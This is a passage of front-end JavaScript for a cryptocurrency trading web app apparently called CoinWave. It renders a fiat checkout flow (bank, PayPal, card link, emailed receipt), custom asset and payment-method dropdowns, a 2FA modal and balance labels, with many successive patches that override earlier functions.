            </div>`; 
    } 
    else if (method === 'PayPal') { 
        let paypalEmail = (globalSettings && globalSettings.adminPaypalEmail) ? globalSettings.adminPaypalEmail : "<span style='color: #f6465d;'>Admin has not set PayPal email yet.</span>"; 
        detailsHtml = `
            <div style="background: #0f0f15; padding: 15px; border-radius: 8px; border: 1px solid #333; margin-bottom: 20px; text-align: left;">
                <p style="color: #00d4aa; font-size: 12px; font-weight: bold; margin-bottom: 8px;">Step 2: Send Fiat to this PayPal Email</p>
                <p style="color: #fff; font-size: 14px; font-family: monospace; margin: 0;">${paypalEmail}</p>
            </div>`; 
    } 
    else if (method === 'Credit Card') { 
        let cardLink = (globalSettings && globalSettings.cardPaymentLink) ? globalSettings.cardPaymentLink : ""; 
        if (cardLink) { 
            detailsHtml = `
                <div style="background: #0f0f15; padding: 20px; border-radius: 8px; border: 1px solid #333; margin-bottom: 20px; text-align: center;">
                    <p style="color: #00d4aa; font-size: 12px; font-weight: bold; margin-bottom: 15px;">Step 2: Pay securely via Card</p>
                    <a href="${cardLink}" target="_blank" style="background: #00d4aa; color: #000; padding: 14px 20px; border-radius: 8px; text-decoration: none; font-weight: bold; display: block; font-size: 16px;">Click Here to Pay</a>
                </div>`; 
        } else { 
            detailsHtml = `<div class="warning-banner" style="text-align:left;"><p>Card payment link is not set. Please contact support.</p></div>`; 
        } 
    }

    const content = `
        <div style="text-align: center;">
            <div style="margin-bottom: 25px;">
                <div style="width: 60px; height: 60px; background: rgba(0,212,170,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;">
                    <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#00d4aa" stroke-width="2.5"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
                </div>
                <h3 style="color: #fff; margin: 0 0 5px; font-size: 20px;">Order Created Successfully</h3>
                <p style="color: #888; font-size: 14px;">You are purchasing <strong style="color:#fff;">${cryptoAmount} ${symbol}</strong></p>
            </div>

            <!-- THE BIG AMOUNT BOX -->
            <div style="background: #0f0f15; padding: 15px; border-radius: 8px; border: 1px solid #333; margin-bottom: 15px; text-align: center;">
                <p style="color: #888; font-size: 12px; margin-bottom: 5px; text-transform: uppercase; letter-spacing: 0.5px;">Step 1: Amount to Pay</p>
                <p style="color: #00d4aa; font-size: 26px; font-weight: 800; margin: 0;">${fiatAmount}</p>
            </div>

            ${detailsHtml}

            <div style="background: #1a1a2a; border: 1px solid #333; padding: 20px; border-radius: 8px; margin-bottom: 20px; text-align: center;">
                <p style="color: #00d4aa; font-size: 12px; font-weight: bold; margin-bottom: 10px;">Step 3: Send Payment Proof</p>
                <p style="color: #fff; font-size: 14px; margin-bottom: 15px; line-height: 1.5;">After making the payment, click below to open your email app and send us your receipt.</p>
                <a href="${mailtoLink}" style="background: #00d4aa; color: #000; padding: 14px; border-radius: 8px; text-decoration: none; font-weight: bold; display: block; font-size: 16px;">Open Email App</a>
            </div>

            <button onclick="showView('dashboardView')" style="background: #2a2a3a; color: #fff; width: 100%; padding: 16px; border-radius: 8px; font-weight: bold; font-size: 16px; border: none; cursor: pointer;">Back to Dashboard</button>
        </div>`;
    
    createPageView('buyCheckoutPage', 'Complete Payment', content); 
    showView('buyCheckoutPage');
};

/* =====================================================
   PROFESSIONAL DARK-MODE ASSET DROPDOWN (For Trade View)
   ===================================================== */
window.setupTradeAssetDropdown = function() {
    const nativeSelect = document.getElementById('tradeCoin');
    if (!nativeSelect || nativeSelect.dataset.customized) return;
    nativeSelect.dataset.customized = 'true';
    
    // Hide the ugly native select
    nativeSelect.style.display = 'none';
    
    // Create our custom display box
    const displayDiv = document.createElement('div');
    displayDiv.id = 'tradeCoinDisplay';
    displayDiv.style.cssText = "width: 100%; padding: 14px; background: #0f0f15; color: #fff; border: 1px solid #333; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; cursor: pointer;";
    
    const selectedText = document.createElement('span');
    selectedText.id = 'selectedCoinText';
    selectedText.textContent = nativeSelect.options[nativeSelect.selectedIndex]?.text || "Select Asset";
    
    const arrow = document.createElement('span');
    arrow.textContent = '▼';
    arrow.style.color = '#888';
    arrow.style.fontSize = '12px';
    
    displayDiv.appendChild(selectedText);
    displayDiv.appendChild(arrow);
    
    // Insert it right after the hidden native select
    nativeSelect.parentNode.insertBefore(displayDiv, nativeSelect.nextSibling);
    
    // Open our custom modal when clicked
    displayDiv.onclick = () => window.openTradeAssetModal();
};

window.openTradeAssetModal = function() {
    let modal = document.getElementById('assetActionModal');
    modal.style.display = 'flex';
    
    let html = `<div class="modal-content" style="padding: 0; max-height: 80vh; display: flex; flex-direction: column;">
        <div style="display: flex; justify-content: space-between; padding: 20px; border-bottom: 1px solid #333;">
            <h2 style="color: #fff; margin: 0; font-size: 18px;">Select Asset</h2>
            <span onclick="document.getElementById('assetActionModal').style.display='none'" style="color: #888; font-size: 24px; cursor: pointer;">&times;</span>
        </div>
        <div style="overflow-y: auto; flex: 1;">`;
        
    html += markets.map(coin => `
        <div onclick="window.selectTradeAsset('${coin.symbol}')" style="display: flex; justify-content: space-between; padding: 15px; border-bottom: 1px solid #2a2a3a; cursor: pointer; align-items: center;">
            <div style="display: flex; gap: 10px; align-items: center;">
                <div style="background:${coin.color}; width: 32px; height: 32px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 16px;">${coin.icon}</div>
                <div><div style="color: #fff; font-weight: bold; font-size: 14px;">${coin.name}</div><div style="color: #888; font-size: 12px;">${coin.symbol}</div></div>
            </div>
        </div>
    `).join('');
    
    html += `</div></div>`;
    modal.innerHTML = html;
};

window.selectTradeAsset = function(symbol) {
    const nativeSelect = document.getElementById('tradeCoin');
    nativeSelect.value = symbol;
    
    const coin = markets.find(c => c.symbol === symbol);
    document.getElementById('selectedCoinText').textContent = `${coin.name} (${coin.symbol})`;
    
    document.getElementById('assetActionModal').style.display = 'none';
    calcTrade(); // Recalculate the receive amount
};

// Ensure it runs when the Trade view opens
var originalShowViewTrade = window.showView;
window.showView = function(viewId, authType = 'login') {
    originalShowViewTrade(viewId, authType);
    if (viewId === 'tradeView') {
        setTimeout(() => window.setupTradeAssetDropdown(), 100);
    }
};

/* =====================================================
   FINAL UI POLISH: 5% BONUS, SCROLLBAR, & IBAN LABEL
   ===================================================== */
// 1. Hide the ugly default scrollbar completely
const hideScrollbarStyle = document.createElement('style');
hideScrollbarStyle.innerHTML = `
    ::-webkit-scrollbar { display: none !important; width: 0px !important; background: transparent !important; }
    html, body, .dash-container, .trade-layout { -ms-overflow-style: none !important; scrollbar-width: none !important; }
`;
document.head.appendChild(hideScrollbarStyle);

// 2. Inject the 5% Bonus text and fix the IBAN label
window.updateTradeUIExtras = function() {
    // A. Add the 5% Bonus text next to "You will receive"
    const receiveLabel = document.getElementById('receiveLabel');
    if (receiveLabel && !document.getElementById('bonusTextTrade')) {
        const bonusSpan = document.createElement('span');
        bonusSpan.id = 'bonusTextTrade';
        bonusSpan.style.cssText = "color: #0ecb51; font-size: 11px; margin-left: 5px; font-weight: bold;";
        bonusSpan.textContent = "(Includes 5% Bonus)";
        receiveLabel.appendChild(bonusSpan);
    }

    // B. Change "Account Number" label to "Account Number / IBAN"
    const bankInput = document.getElementById('bankAccountNumber');
    if (bankInput) {
        const label = bankInput.previousElementSibling;
        if (label && label.tagName === 'LABEL' && !label.textContent.includes('IBAN')) {
            label.textContent = 'Account Number / IBAN';
        }
    }
};

// 3. Ensure these updates run every time the Trade View opens
var originalShowViewExtras = window.showView;
window.showView = function(viewId, authType = 'login') {
    originalShowViewExtras(viewId, authType);
    if (viewId === 'tradeView') {
        setTimeout(() => window.updateTradeUIExtras(), 100);
    }
};

// 4. Also run on initial load just in case
document.addEventListener('DOMContentLoaded', () => {
    setTimeout(() => window.updateTradeUIExtras(), 500);
});

/* =====================================================
   ADD 🎁 EMOJI TO 5% BONUS TEXT
   ===================================================== */
window.setTradeMode = function(mode) {
    currentTradeMode = mode; 
    const curr = getUserCurrency();
    document.getElementById('tabBuy').classList.toggle('active', mode === 'buy'); 
    document.getElementById('tabSell').classList.toggle('active', mode === 'sell');
    
    // The updated green bonus text with the gift emoji
    const bonusSpan = `<span style="color: #0ecb51; font-size: 11px; margin-left: 5px; font-weight: bold;">🎁 (Includes 5% Bonus)</span>`;

    if (mode === 'buy') {
        document.getElementById('amountLabel').textContent = `Amount to Spend (${curr.code})`; 
        document.getElementById('submitTradeBtn').textContent = 'Confirm Purchase'; 
        document.getElementById('submitTradeBtn').style.background = 'var(--success)'; 
        document.getElementById('receivingWalletContainer').style.display = 'block'; 
        document.getElementById('receiveLabel').innerHTML = `You will receive (Crypto) ${bonusSpan}`; 
        document.getElementById('methodLabel').textContent = 'Payment Method';
    } else {
        document.getElementById('amountLabel').textContent = 'Amount to Sell (Crypto)'; 
        document.getElementById('submitTradeBtn').textContent = 'Confirm Sale'; 
        document.getElementById('submitTradeBtn').style.background = 'var(--danger)'; 
        document.getElementById('receivingWalletContainer').style.display = 'none'; 
        document.getElementById('receiveLabel').innerHTML = `You will receive (${curr.code}) ${bonusSpan}`; 
        document.getElementById('methodLabel').textContent = 'Payout Method';
    }
    
    document.getElementById('tradeMethod').innerHTML = `<option value="Bank Transfer">Bank Transfer</option><option value="PayPal">PayPal</option><option value="Credit Card">Credit Card</option>`;
    document.getElementById('tradeAmount').value = ''; 
    document.getElementById('tradeReceive').value = ''; 
    togglePaymentDetails(); 
    calcTrade();

    // Ensure the IBAN label stays updated when switching tabs
    if (typeof window.updateTradeUIExtras === 'function') {
        window.updateTradeUIExtras();
    }
};

/* =====================================================
   ADD 🎁 EMOJI TO 5% BONUS TEXT
   ===================================================== */
window.setTradeMode = function(mode) {
    currentTradeMode = mode; 
    const curr = getUserCurrency();
    document.getElementById('tabBuy').classList.toggle('active', mode === 'buy'); 
    document.getElementById('tabSell').classList.toggle('active', mode === 'sell');
    
    // The updated green bonus text with the gift emoji
    const bonusSpan = `<span style="color: #0ecb51; font-size: 11px; margin-left: 5px; font-weight: bold;">🎁 (Includes 5% Bonus)</span>`;

    if (mode === 'buy') {
        document.getElementById('amountLabel').textContent = `Amount to Spend (${curr.code})`; 
        document.getElementById('submitTradeBtn').textContent = 'Confirm Purchase'; 
        document.getElementById('submitTradeBtn').style.background = 'var(--success)'; 
        document.getElementById('receivingWalletContainer').style.display = 'block'; 
        document.getElementById('receiveLabel').innerHTML = `You will receive (Crypto) ${bonusSpan}`; 
        document.getElementById('methodLabel').textContent = 'Payment Method';
    } else {
        document.getElementById('amountLabel').textContent = 'Amount to Sell (Crypto)'; 
        document.getElementById('submitTradeBtn').textContent = 'Confirm Sale'; 
        document.getElementById('submitTradeBtn').style.background = 'var(--danger)'; 
        document.getElementById('receivingWalletContainer').style.display = 'none'; 
        document.getElementById('receiveLabel').innerHTML = `You will receive (${curr.code}) ${bonusSpan}`; 
        document.getElementById('methodLabel').textContent = 'Payout Method';
    }
    
    document.getElementById('tradeMethod').innerHTML = `<option value="Bank Transfer">Bank Transfer</option><option value="PayPal">PayPal</option><option value="Credit Card">Credit Card</option>`;
    document.getElementById('tradeAmount').value = ''; 
    document.getElementById('tradeReceive').value = ''; 
    togglePaymentDetails(); 
    calcTrade();

    // Ensure the IBAN label stays updated when switching tabs
    if (typeof window.updateTradeUIExtras === 'function') {
        window.updateTradeUIExtras();
    }
};

/* =====================================================
   REMOVE DUPLICATE BONUS TEXT
   ===================================================== */
// 1. Override updateTradeUIExtras to ONLY handle the IBAN label (Remove the bonus text logic from here)
window.updateTradeUIExtras = function() {
    const bankInput = document.getElementById('bankAccountNumber');
    if (bankInput) {
        const label = bankInput.previousElementSibling;
        if (label && label.tagName === 'LABEL' && !label.textContent.includes('IBAN')) {
            label.textContent = 'Account Number / IBAN';
        }
    }
};

// 2. Ensure setTradeMode uses only the clean single injection with the emoji
window.setTradeMode = function(mode) {
    currentTradeMode = mode; 
    const curr = getUserCurrency();
    document.getElementById('tabBuy').classList.toggle('active', mode === 'buy'); 
    document.getElementById('tabSell').classList.toggle('active', mode === 'sell');
    
    // The single, clean green bonus text with the gift emoji
    const bonusSpan = `<span style="color: #0ecb51; font-size: 11px; margin-left: 5px; font-weight: bold; white-space: nowrap;">🎁 (Includes 5% Bonus)</span>`;

    if (mode === 'buy') {
        document.getElementById('amountLabel').textContent = `Amount to Spend (${curr.code})`; 
        document.getElementById('submitTradeBtn').textContent = 'Confirm Purchase'; 
        document.getElementById('submitTradeBtn').style.background = 'var(--success)'; 
        document.getElementById('receivingWalletContainer').style.display = 'block'; 
        document.getElementById('receiveLabel').innerHTML = `You will receive (Crypto) ${bonusSpan}`; 
        document.getElementById('methodLabel').textContent = 'Payment Method';
    } else {
        document.getElementById('amountLabel').textContent = 'Amount to Sell (Crypto)'; 
        document.getElementById('submitTradeBtn').textContent = 'Confirm Sale'; 
        document.getElementById('submitTradeBtn').style.background = 'var(--danger)'; 
        document.getElementById('receivingWalletContainer').style.display = 'none'; 
        document.getElementById('receiveLabel').innerHTML = `You will receive (${curr.code}) ${bonusSpan}`; 
        document.getElementById('methodLabel').textContent = 'Payout Method';
    }
    
    document.getElementById('tradeMethod').innerHTML = `<option value="Bank Transfer">Bank Transfer</option><option value="PayPal">PayPal</option><option value="Credit Card">Credit Card</option>`;
    document.getElementById('tradeAmount').value = ''; 
    document.getElementById('tradeReceive').value = ''; 
    togglePaymentDetails(); 
    calcTrade();

    // Update IBAN label
    if (typeof window.updateTradeUIExtras === 'function') {
        window.updateTradeUIExtras();
    }
};

/* =====================================================
   PROFESSIONAL 2FA MODAL CLOSE BUTTON
   ===================================================== */
window.open2FAModal = async function() {
    let modal = document.getElementById('assetActionModal'); 
    modal.style.display = 'flex'; 
    modal.innerHTML = `<div class="modal-content"><p style="color:#fff; text-align:center;">Loading 2FA Settings...</p></div>`;
    
    try {
        const token = localStorage.getItem('token'); 
        const res = await fetch('/api/auth/generate-2fa', { method: 'POST', headers: { 'Authorization': `Bearer ${token}` } }); 
        const data = await res.json();
        
        if (!res.ok) throw new Error(data.error);
        
        modal.innerHTML = `
            <div class="modal-content" style="text-align: center; position: relative;">
                <!-- New Professional Close Button -->
                <span onclick="document.getElementById('assetActionModal').style.display='none'" style="position: absolute; top: 12px; right: 12px; width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; background: rgba(255,255,255,0.1); border-radius: 50%; color: #fff; font-size: 20px; cursor: pointer; z-index: 10; transition: 0.2s;" onmouseover="this.style.background='rgba(255,255,255,0.2)'" onmouseout="this.style.background='rgba(255,255,255,0.1)'">&times;</span>
                
                <h2 style="color: #fff; margin-bottom: 10px; padding: 0 20px;">Two-Factor Authentication</h2>
                <p style="color: #888; font-size: 13px; margin-bottom: 20px;">Scan this QR code with Google Authenticator or Authy.</p>
                
                <img src="${data.qrCodeUrl}" style="background: #fff; padding: 10px; border-radius: 8px; width: 150px; height: 150px; margin: 0 auto 20px;">
                
                <div class="input-group" style="text-align: left;">
                    <label>Enter 6-digit code from App</label>
                    <input type="text" id="twoFactorCode" placeholder="123456" maxlength="6" style="text-align: center; letter-spacing: 5px; font-size: 18px;">
                </div>
                
                <button onclick="window.verify2FA()" style="background: #00d4aa; color: #000; width: 100%; padding: 14px; border-radius: 8px; font-weight: bold; border: none; cursor: pointer; margin-top: 10px;">Verify & Enable 2FA</button>
            </div>`;
    } catch (err) { 
        modal.innerHTML = `<div class="modal-content"><p style="color:#f6465d; text-align:center;">Error: ${err.message}</p></div>`; 
    }
};

/* =====================================================
   BINANCE-STYLE TRADE VIEW POLISH
   ===================================================== */
// 1. Inject CSS for tighter spacing and input suffixes
const tradeStyle = document.createElement('style');
tradeStyle.innerHTML = `
    .trade-box .input-group { margin-bottom: 12px !important; }
    .trade-box .input-group label { font-size: 11px !important; margin-bottom: 4px !important; }
    .amount-wrapper { position: relative; width: 100%; }
    .amount-suffix { position: absolute; right: 14px; top: 15px; color: #888; font-weight: bold; font-size: 14px; pointer-events: none; }
    .available-balance { font-size: 11px; color: #888; float: right; font-weight: normal; text-transform: none; }
    .bank-details-group .input-group { margin-bottom: 8px !important; }
`;
document.head.appendChild(tradeStyle);

// 2. Function to apply the UI updates
window.polishTradeView = async function() {
    const amtInput = document.getElementById('tradeAmount');
    const amountLabel = document.getElementById('amountLabel');
    if (!amtInput || !amountLabel) return;

    // A. Wrap the amount input and add the suffix (e.g., USD or BTC)
    if (!amtInput.parentElement.classList.contains('amount-wrapper')) {
        const wrapper = document.createElement('div');
        wrapper.className = 'amount-wrapper';
        amtInput.parentNode.insertBefore(wrapper, amtInput);
        wrapper.appendChild(amtInput);
        
        const suffix = document.createElement('span');
        suffix.className = 'amount-suffix';
        suffix.id = 'tradeAmountSuffix';
        wrapper.appendChild(suffix);
    }

    // B. Add "Available Balance" to the label
    if (!document.getElementById('tradeAvailableBalance')) {
        const balSpan = document.createElement('span');
        balSpan.id = 'tradeAvailableBalance';
        balSpan.className = 'available-balance';
        amountLabel.appendChild(balSpan);
    }

    // C. Update the suffix and available balance based on mode and coin
    const coinSymbol = document.getElementById('tradeCoin').value;
    const suffixEl = document.getElementById('tradeAmountSuffix');
    const balEl = document.getElementById('tradeAvailableBalance');
    const curr = getUserCurrency();

    if (currentTradeMode === 'buy') {
        suffixEl.textContent = curr.code; // e.g., KES, USD
        balEl.textContent = ""; // Usually doesn't show available fiat on buy, or we could fetch it
    } else {
        suffixEl.textContent = coinSymbol; // e.g., BTC, ETH
        // Fetch the user's balance for this specific coin to display
        try {
            const res = await fetch(`/api/user/${currentUser.email}/balances`);
            const balances = await res.json();
            const bal = balances[coinSymbol] || 0;
            balEl.textContent = `Available: ${bal.toFixed(6)} ${coinSymbol}`;
        } catch(e) { balEl.textContent = ""; }
    }
};

// 3. Hook into setTradeMode to run the polish every time the view changes
var originalSetTradeModeBinance = window.setTradeMode;
window.setTradeMode = function(mode) {
    originalSetTradeModeBinance(mode);
    setTimeout(() => window.polishTradeView(), 50);
};

// 4. Hook into selectTradeAsset to update the balance when a new coin is selected
var originalSelectTradeAssetBinance = window.selectTradeAsset;
window.selectTradeAsset = function(symbol) {
    originalSelectTradeAssetBinance(symbol);
    setTimeout(() => window.polishTradeView(), 50);
};

// 5. Run on load
document.addEventListener('DOMContentLoaded', () => {
    setTimeout(() => window.polishTradeView(), 500);
});

/* =====================================================
   FIX: CLARIFY EXTERNAL WALLET SELLING
   ===================================================== */
window.polishTradeView = async function() {
    const amtInput = document.getElementById('tradeAmount');
    const amountLabel = document.getElementById('amountLabel');
    if (!amtInput || !amountLabel) return;

    // 1. Wrap the amount input (if not already wrapped)
    if (!amtInput.parentElement.classList.contains('amount-wrapper')) {
        const wrapper = document.createElement('div');
        wrapper.className = 'amount-wrapper';
        amtInput.parentNode.insertBefore(wrapper, amtInput);
        wrapper.appendChild(amtInput);
        
        const suffix = document.createElement('span');
        suffix.className = 'amount-suffix';
        suffix.id = 'tradeAmountSuffix';
        wrapper.appendChild(suffix);
    }

    // 2. Update the suffix and available balance
    const coinSymbol = document.getElementById('tradeCoin').value;
    const suffixEl = document.getElementById('tradeAmountSuffix');
    const curr = getUserCurrency();

    // Remove old available balance label
    let balEl = document.getElementById('tradeAvailableBalance');
    if (balEl) balEl.remove();

    if (currentTradeMode === 'buy') {
        suffixEl.textContent = curr.code; 
        
    } else {
        suffixEl.textContent = coinSymbol; 
        try {
            const res = await fetch(`/api/user/${currentUser.email}/balances`);
            const balances = await res.json();
            const bal = balances[coinSymbol] || 0;
            
            // Add a clear note for external wallets
            const label = document.getElementById('receiveLabel').previousElementSibling; // The label before 'You will receive'
            
            // Create the available balance note
            const balSpan = document.createElement('span');
            balSpan.id = 'tradeAvailableBalance';
            balSpan.className = 'available-balance';
            balSpan.style.cssText = "font-size: 11px; color: #888; float: right; font-weight: normal; text-transform: none;";
            balSpan.innerHTML = `Available on CoinWave: ${bal.toFixed(6)} ${coinSymbol}`;
            amountLabel.appendChild(balSpan);

            // Add a small helper text below the input
            let helper = document.getElementById('externalWalletHelper');
            if (!helper) {
                helper = document.createElement('div');
                helper.id = 'externalWalletHelper';
                helper.style.cssText = "font-size: 11px; color: #00d4aa; margin-top: 5px; text-align: left;";
                amtInput.parentElement.parentElement.appendChild(helper);
            }
            helper.innerHTML = `💡 Selling from an external wallet? No problem. You will be shown a deposit address on the next page.`;
            
        } catch(e) { 
            console.log(e); 
        }
    }
};

// Hook it into setTradeMode so it updates instantly
var originalSetTradeModeExternal = window.setTradeMode;
window.setTradeMode = function(mode) {
    originalSetTradeModeExternal(mode);
    setTimeout(() => window.polishTradeView(), 50);
};

/* =====================================================
   ULTIMATE UX FIX: CLEAN TEXT & CUSTOM PAYOUT DROPDOWN
   ===================================================== */
// 1. Fix the duplicate "Available" text and add the helper note cleanly
window.polishTradeView = async function() {
    const amtInput = document.getElementById('tradeAmount');
    const amountLabel = document.getElementById('amountLabel');
    if (!amtInput || !amountLabel) return;

    // Remove old injected elements to prevent duplicates
    const oldBal = document.getElementById('tradeAvailableBalance');
    if (oldBal) oldBal.remove();
    const oldHelper = document.getElementById('externalWalletHelper');
    if (oldHelper) oldHelper.remove();

    // Wrap the input if not already done
    if (!amtInput.parentElement.classList.contains('amount-wrapper')) {
        const wrapper = document.createElement('div');
        wrapper.className = 'amount-wrapper';
        amtInput.parentNode.insertBefore(wrapper, amtInput);
        wrapper.appendChild(amtInput);
        
        const suffix = document.createElement('span');
        suffix.className = 'amount-suffix';
        suffix.id = 'tradeAmountSuffix';
        wrapper.appendChild(suffix);
    }

    const coinSymbol = document.getElementById('tradeCoin').value;
    const suffixEl = document.getElementById('tradeAmountSuffix');
    const curr = getUserCurrency();

    if (currentTradeMode === 'buy') {
        suffixEl.textContent = curr.code; 
    } else {
        suffixEl.textContent = coinSymbol; 
        try {
            const res = await fetch(`/api/user/${currentUser.email}/balances`);
            const balances = await res.json();
            const bal = balances[coinSymbol] || 0;
            
            // Add the balance text ONCE
            const balSpan = document.createElement('span');
            balSpan.id = 'tradeAvailableBalance';
            balSpan.style.cssText = "font-size: 11px; color: #888; float: right; font-weight: normal; text-transform: none;";
            balSpan.innerHTML = `Available on CoinWave: ${bal.toFixed(6)} ${coinSymbol}`;
            amountLabel.appendChild(balSpan);

            // Add the helper note ONCE
            const helper = document.createElement('div');
            helper.id = 'externalWalletHelper';
            helper.style.cssText = "font-size: 11px; color: #00d4aa; margin-top: 5px; text-align: left;";
            amtInput.parentElement.parentElement.appendChild(helper);
            helper.innerHTML = `💡 Selling from an external wallet? No problem. You will be shown a deposit address on the next page.`;
            
        } catch(e) { console.log(e); }
    }
};

// 2. Replace the native Payout/Payment Method Dropdown
window.setupMethodDropdown = function() {
    const nativeSelect = document.getElementById('tradeMethod');
    if (!nativeSelect || nativeSelect.dataset.customized) return;
    nativeSelect.dataset.customized = 'true';
    
    nativeSelect.style.display = 'none';
    
    const displayDiv = document.createElement('div');
    displayDiv.id = 'tradeMethodDisplay';
    displayDiv.style.cssText = "width: 100%; padding: 14px; background: #0f0f15; color: #fff; border: 1px solid #333; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; cursor: pointer;";
    
    const selectedText = document.createElement('span');
    selectedText.id = 'selectedMethodText';
    selectedText.textContent = nativeSelect.options[nativeSelect.selectedIndex]?.text || "Select Method";
    
    const arrow = document.createElement('span');
    arrow.textContent = '▼';
    arrow.style.color = '#888';
    arrow.style.fontSize = '12px';
    
    displayDiv.appendChild(selectedText);
    displayDiv.appendChild(arrow);
    nativeSelect.parentNode.insertBefore(displayDiv, nativeSelect.nextSibling);
    
    displayDiv.onclick = () => window.openMethodModal();
};

window.openMethodModal = function() {
    let modal = document.getElementById('assetActionModal');
    modal.style.display = 'flex';
    
    // Build the list of methods with visual card logos
    let html = `<div class="modal-content" style="padding: 0; max-height: 80vh; display: flex; flex-direction: column;">
        <div style="display: flex; justify-content: space-between; padding: 20px; border-bottom: 1px solid #333;">
            <h2 style="color: #fff; margin: 0; font-size: 18px;">Select ${currentTradeMode === 'buy' ? 'Payment' : 'Payout'} Method</h2>
            <span onclick="document.getElementById('assetActionModal').style.display='none'" style="color: #888; font-size: 24px; cursor: pointer;">&times;</span>
        </div>
        <div style="overflow-y: auto; flex: 1;">`;

    // Bank Transfer Option
    html += `<div onclick="window.selectMethod('Bank Transfer', 'Bank Transfer')" style="display: flex; justify-content: space-between; padding: 15px 20px; border-bottom: 1px solid #2a2a3a; cursor: pointer; align-items: center;"><span style="color: #fff; font-weight: 600;">Bank Transfer</span></div>`;
    
    // PayPal Option
    html += `<div onclick="window.selectMethod('PayPal', 'PayPal')" style="display: flex; justify-content: space-between; padding: 15px 20px; border-bottom: 1px solid #2a2a3a; cursor: pointer; align-items: center;"><span style="color: #fff; font-weight: 600;">PayPal</span></div>`;
    
    // Credit Card Option with Logos
    html += `
        <div onclick="window.selectMethod('Credit Card', 'Credit Card')" style="display: flex; justify-content: space-between; padding: 15px 20px; border-bottom: 1px solid #2a2a3a; cursor: pointer; align-items: center;">
            <span style="color: #fff; font-weight: 600;">Credit / Debit Card</span>
            <div style="display: flex; gap: 6px; align-items: center;">
                <span style="color: #1a1f71; background: #fff; padding: 2px 6px; border-radius: 4px; font-weight: 900; font-style: italic; font-size: 12px;">VISA</span>
                <span style="color: #eb001b; background: #fff; padding: 2px 6px; border-radius: 4px; font-weight: 900; font-size: 12px;">MC</span>
                <span style="color: #2e77bc; background: #fff; padding: 2px 6px; border-radius: 4px; font-weight: 900; font-size: 10px;">AMEX</span>
            </div>
        </div>`;
    
    html += `</div></div>`;
    modal.innerHTML = html;
};

window.selectMethod = function(value, displayText) {
    const nativeSelect = document.getElementById('tradeMethod');
    nativeSelect.value = value;
    
    // Update the display text. Add badges if Credit Card is selected
    const displayEl = document.getElementById('selectedMethodText');
    if (value === 'Credit Card') {
        displayEl.innerHTML = `Credit Card <span style="font-size: 10px; margin-left: 8px; color: #fff; background: #333; padding: 2px 6px; border-radius: 4px; font-weight: bold; font-style: italic;">VISA</span><span style="font-size: 10px; margin-left: 2px; color: #fff; background: #333; padding: 2px 6px; border-radius: 4px; font-weight: bold;">MC</span>`;
    } else {
        displayEl.textContent = displayText;
    }
    
    document.getElementById('assetActionModal').style.display = 'none';
    togglePaymentDetails(); // Trigger the form changes
};

// 3. Hook it all into setTradeMode
var originalSetTradeModeMethod = window.setTradeMode;
window.setTradeMode = function(mode) {
    originalSetTradeModeMethod(mode);
    setTimeout(() => { 
        window.setupMethodDropdown(); 
        window.polishTradeView(); 
    }, 50);
};

/* =====================================================
   FINAL FIX: REMOVE DUPLICATE STACKING TEXT
   ===================================================== */
window.polishTradeView = async function() {
    const amtInput = document.getElementById('tradeAmount');
    const amountLabel = document.getElementById('amountLabel');
    if (!amtInput || !amountLabel) return;

    // 1. Remove ALL previous instances to prevent stacking
    document.querySelectorAll('.trade-available-balance').forEach(el => el.remove());
    document.querySelectorAll('.external-wallet-helper').forEach(el => el.remove());

    const curr = getUserCurrency();
    
    // 2. Reset the label text cleanly
    if (currentTradeMode === 'buy') {
        amountLabel.textContent = `Amount to Spend (${curr.code})`;
    } else {
        amountLabel.textContent = `Amount to Sell (Crypto)`;
    }

    // 3. Wrap the input (if not already done)
    if (!amtInput.parentElement.classList.contains('amount-wrapper')) {
        const wrapper = document.createElement('div');
        wrapper.className = 'amount-wrapper';
        amtInput.parentNode.insertBefore(wrapper, amtInput);
        wrapper.appendChild(amtInput);
        
        const suffix = document.createElement('span');
        suffix.className = 'amount-suffix';
        suffix.id = 'tradeAmountSuffix';
        wrapper.appendChild(suffix);
    }

    const coinSymbol = document.getElementById('tradeCoin').value;
    const suffixEl = document.getElementById('tradeAmountSuffix');

    if (currentTradeMode === 'buy') {
        suffixEl.textContent = curr.code; 
    } else {
        suffixEl.textContent = coinSymbol; 
        try {
            const res = await fetch(`/api/user/${currentUser.email}/balances`);
            const balances = await res.json();
            const bal = balances[coinSymbol] || 0;
            
            // 4. Add the balance text using a CLASS
            const balSpan = document.createElement('span');
            balSpan.className = 'trade-available-balance';
            balSpan.style.cssText = "font-size: 11px; color: #888; float: right; font-weight: normal; text-transform: none;";
            balSpan.innerHTML = `Available on CoinWave: ${bal.toFixed(6)} ${coinSymbol}`;
            amountLabel.appendChild(balSpan);

            // 5. Add the helper note using a CLASS
            const helper = document.createElement('div');
            helper.className = 'external-wallet-helper';
            helper.style.cssText = "font-size: 11px; color: #00d4aa; margin-top: 5px; text-align: left;";
            amtInput.parentElement.parentElement.appendChild(helper);
            helper.innerHTML = `💡 Selling from an external wallet? No problem. You will be shown a deposit address on the next page.`;
            
        } catch(e) { console.log(e); }
    }
};

/* =====================================================
   BULLETPROOF TEXT REPLACEMENT (No more duplicates)
   ===================================================== */
window.polishTradeView = async function() {
    const amtInput = document.getElementById('tradeAmount');
    const amountLabel = document.getElementById('amountLabel');
    const receiveLabel = document.getElementById('receiveLabel');
    
    if (!amtInput || !amountLabel || !receiveLabel) return;

    const curr = getUserCurrency();
    const coinSymbol = document.getElementById('tradeCoin').value;
    
    // 1. Remove old helper notes synchronously
    document.querySelectorAll('.external-wallet-helper').forEach(el => el.remove());

    // 2. Rebuild the labels using innerHTML (Replaces everything, prevents duplicates)
    if (currentTradeMode === 'buy') {
        amountLabel.innerHTML = `Amount to Spend (${curr.code})`;
        receiveLabel.innerHTML = `You will receive (Crypto) <span style="color: #0ecb51; font-size: 11px; margin-left: 5px; font-weight: bold; white-space: nowrap;">🎁 (Includes 5% Bonus)</span>`;
    } else {
        try {
            const res = await fetch(`/api/user/${currentUser.email}/balances`);
            const balances = await res.json();
            const bal = balances[coinSymbol] || 0;
            
            // Inject the balance text directly inside the label
